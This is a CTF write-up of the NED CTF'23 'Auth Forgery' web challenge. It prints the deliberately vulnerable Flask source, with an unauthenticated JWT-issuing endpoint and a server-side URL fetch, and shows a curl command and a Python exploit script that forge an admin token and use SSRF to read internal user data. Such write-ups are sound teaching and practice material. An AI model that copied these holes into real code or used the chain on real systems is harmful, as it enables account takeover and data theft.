---
title: NED CTF'23 - Web - Auth Forgery
date: '2023-07-03'
tags: ['ctf', 'web', 'nedctf', 'writeup', 'auth-bypass', 'ssrf', 'jwt']
draft: false
summary: Auth bypassing and using SSRF to get the flag.
---

## Challenge Description

We await those who can deceive the system and access the forbidden territories.

Author: [Saad Akhtar](https://twitter.com/ssaadakhtarr)

[Challenge-Link](http://159.223.192.150:5003/)

![chal-info](/static/writeups/nedctf/web/auth0.png)

## Solution

This challenge involved firstly bypassing auth to login as a different user, then utilizing SSRF to get the flag. Downloading the files, we see the following files are given to us:

![files](/static/writeups/nedctf/web/auth1.png)

Let's checkout `app.py`

```python:app.py
from flask import (
    Flask,
    redirect,
    request,
    render_template,
    jsonify,
    make_response,
    abort,
    flash,
    url_for,
)
import jwt, re, requests
from urllib.parse import urlparse
import socket
import threading
import time


profile_pictures = {
    "admin": "https://mobimg.b-cdn.net/v3/fetch/62/624e27fde335d49e2dd3c6b75c6027a3.jpeg"
}

app = Flask(__name__)
app.config['SECRET_KEY'] = 'REDACTED'

# A dictionary to hold registered users

# TODO: Set up a database for users

users = {
    'admin': 'REDACTED',
    'kid': 'REDACTED',
    'luffy': 'REDACTED',
    'law': 'REDACTED',
    'shanks': 'NCC{t3st_fl4g}'
}

# Reset the profile picture

def reset_profile_pictures():
    while True:
        global profile_pictures
        profile_pictures = {
            "admin": "https://mobimg.b-cdn.net/v3/fetch/62/624e27fde335d49e2dd3c6b75c6027a3.jpeg"
        }
        time.sleep(60)  # Reset the dictionary every 60 seconds


def authenticate_user(username, password):
    if username in users and users[username] == password:
        return True
    return False


# Define the home endpoint, which redirects to /login
@app.route("/")
def home():
    return redirect("/login")


# Define the login endpoint, which displays the login form
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if authenticate_user(username, password):
            jwt_token = jwt.encode(
                {"username": username}, app.config["SECRET_KEY"], algorithm="HS256"
            )
            response = make_response(
                redirect("/api/token?username={}".format(username))
            )
            response.set_cookie("JWT", jwt_token)
            return response
        else:
            error = "Invalid username or password"
    return render_template("login.html", error=error)


# Define the registration endpoint, which displays the registration form
@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    success = None

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # Register the user

        if username in users:
            return render_template("register.html", error="Username already taken")

        users[username] = password

        # Show a success message and redirect the user to the login page
        return render_template("register.html", success="Registration successful")

    # success = 'Registration successful! You can now log in with your new account.'

    return render_template("register.html", error=error, success=success)


# Define the dashboard endpoint, which displays the user's dashboard
@app.route("/dashboard")
def dashboard():
    # Check if the user is logged in by verifying the JWT token in the cookie
    token = request.cookies.get("JWT")
    try:
        payload = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
        username = payload["username"]
        profile_picture = profile_pictures.get(username)
    except (jwt.exceptions.InvalidTokenError, KeyError):
        return redirect("/login")

    return render_template(
        "dashboard.html", username=username, profile_picture=profile_picture
    )


# Define the API endpoint that returns the JWT token
@app.route("/api/token")
def get_token():
    username = request.args.get("username")
    if not username:
        return jsonify(error="Missing username"), 400

    # Check if the user exists and generate a JWT token for them

    # Generate a JWT token for the user
    
    token = jwt.encode(
        {"username": username}, app.config["SECRET_KEY"], algorithm="HS256"
    )

    # Set the token as a cookie and redirect to the dashboard
    response = make_response(redirect("/dashboard"))
    response.set_cookie("JWT", token)
    return response


# Define the logout endpoint, which logs the user out by deleting the JWT cookie and redirecting to the login page
@app.route("/logout", methods=["POST"])
def logout():
    # Delete the JWT cookie and redirect to the login page
    response = make_response(redirect("/login"))
    response.delete_cookie("JWT")
    return response


@app.route("/api/users")
def get_users():

    if request.remote_addr != "127.0.0.1":
        abort(403)

    response = make_response(jsonify(users))
    return response


# set the profile picture in admin panel


@app.route("/set_profile_picture", methods=["POST"])
def set_profile_picture():
    profile_picture = request.form.get("profile_picture_url")
    token = request.cookies.get("JWT")
    if not token:
        flash("You are not logged in.", "error")
        return redirect(url_for("login"))
    try:
        payload = jwt.decode(token, app.config["SECRET_KEY"], algorithms=["HS256"])
        username = payload["username"]

        try:
            response = requests.get(profile_picture)
            if response.status_code == 200:
                if "image" in response.headers.get("Content-Type"):
                    profile_pictures[username] = response.url
                    return render_template(
                        "dashboard.html",
                        username=username,
                        profile_picture=profile_picture,
                    )
                else:
                    profile_pictures[username] = response.url
                    return render_template(
                        "dashboard.html",
                        username=username,
                        profile_picture=profile_picture,
                        response=response.text,
                    )
            else:
                flash("Error retrieving profile picture.", "error")
        except requests.exceptions.RequestException as e:
            flash("Error retrieving profile picture: {}".format(str(e)), "error")

    except jwt.ExpiredSignatureError:
        flash("Token expired. Please log in again.", "error")
        return redirect(url_for("login"))
    except (jwt.InvalidTokenError, KeyError):
        flash("Invalid token. Please log in again.", "error")
        return redirect(url_for("login"))
    return redirect(url_for("dashboard"))


if __name__ == "__main__":
    reset_thread = threading.Thread(target=reset_profile_pictures)
    reset_thread.start()
    app.run(host="0.0.0.0", port=5003)
```

Just reading the code, we can note the following things

- The flag is stored in `users['shanks']`
- `/api/token` is not verifying if the user exists or not, so we can get a token for any user and it's not checking if the request is coming from an internal IP/authorized user or not.
- `/api/users` will give the list of users and their passwords if the request is coming from an internal IP.
- `/set_profile_picture` will check if the response contains an image, it will set that profile picture for the user, if not, it will simply give the body of the response in the text.

Now, in order to exploit this, we'll do the following

1. Get a token for `admin` user
2. Make request to `/set_profile_picture` with the `profile_picture_url` as `http://127.0.0.1:5003/api/users`.
3. Read the flag.


### 1. Get a token for `admin` user

We can simply go to `/api/token?username=admin` and get the token for `admin` user. Do this, we can make a cURL request

```bash
$ curl -XGET -v "http://159.223.192.150:5003/api/token?username=admin"
```

![token](/static/writeups/nedctf/web/auth2.png)

Or, we can simply visit the [URL](http://159.223.192.150:5003/api/token?username=admin), and then we'll be redirect to `/dashboard`

![dashboard](/static/writeups/nedctf/web/auth3.png)

### 2. Make request to `/set_profile_picture` with the `profile_picture_url` as `http://127.0.0.1:5003/api/users`.

Now, on the dashboard, we have a simple form. So, inside the form, we can add the value as `http://127.0.0.1:5003/api/users` and submit the form.

![form](/static/writeups/nedctf/web/auth4.png)

### 3. Read the flag

In the response, we can see all the users being displayed, so we can see the flag

![flag](/static/writeups/nedctf/web/auth5.png)

```md
Flag: NCC{au7h_th3n_$$rf}
```

Now, let's write a python script to do this

```python:exploit.py
#!/usr/bin/env python3

import requests
import re

url = "http://159.223.192.150:5003"
print("[*] Fetching the admin jwt token: ", end='')
sess = requests.Session()
r = sess.get(f"{url}/api/token?username=admin")
print(sess.cookies.get_dict())

print(f"[*] Making request to /set_profile_picture")
r = sess.post(f"{url}/set_profile_picture", data={"profile_picture_url" : "http://127.0.0.1:5003/api/users"})

flag = f"{re.findall('(NCC{(.*?)})', r.text)[0][0]}"
print(f"[*] Flag: {flag}")
```

Running this script, we get the following output:

```md
[*] Fetching the admin jwt token: {'JWT': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Dw4EfY6pBMfHZnG4Q4b9cSudgS_2XzcZ3sldeoQBleQ'}
[*] Making request to /set_profile_picture
[*] Flag: NCC{au7h_th3n_$$rf}
```
